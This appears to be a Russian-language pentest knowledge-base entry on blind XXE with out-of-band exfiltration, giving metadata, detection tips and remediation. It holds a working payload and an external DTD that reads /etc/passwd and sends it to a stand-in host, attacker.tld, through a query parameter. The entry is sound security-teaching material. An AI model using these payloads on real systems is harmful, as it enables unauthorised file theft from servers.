---
id: xxe-blind-oob-exfiltration
title: "Blind XXE: OOB-эксфильтрация через внешний DTD"
type: xxe
target: xml
category: web
difficulty: advanced
bypass: filter
tags: [xxe, blind, oob, dtd]
tested_on: ["Java Xerces", "libxml2"]
success_rate: 0.4
risk: high
cwe: "CWE-611"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
graph:
  - target: "xxe"
    type: instance_of
  - target: "oob"
    type: technique_of
  - target: "data-exfiltration"
    type: leads_to
---

# Blind XXE: OOB-эксфильтрация через внешний DTD

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % x SYSTEM "http://attacker.tld/evil.dtd"> %x;]>
<root>1</root>
```

## Explanation

Когда вывод сущности не возвращается (blind), данные уводят наружу через внешний DTD:

```xml
<!-- evil.dtd на сервере атакующего -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?d=%file;'>">
%eval; %exfil;
```

Содержимое файла попадает в query-параметр запроса к атакующему.
Вложенные параметрические сущности нужны, потому что XML запрещает использовать
`%file;` прямо внутри объявления другой сущности.

## Detection

1. Подключите свой DTD и проверьте, приходит ли HTTP-запрос (collaborator).
2. Ошибки парсера вида `The processing instruction target matching "[xX][mM][lL]" is not allowed`
   или `invalid character in entity` говорят, что XXE сработал, но данные не прошли в URL —
   кодируйте base64 через `php://filter`.
3. Логи DTD-сервера = подтверждение.

## Remediation

- Полный запрет DTD (`disallow-doctype-decl`).
- Egress-фильтрация исходящих соединений для серверов приложений.
- Мониторинг запросов к внешним `.dtd`.
- Санитизация/отклонение XML с `<!DOCTYPE` на границе (API gateway).
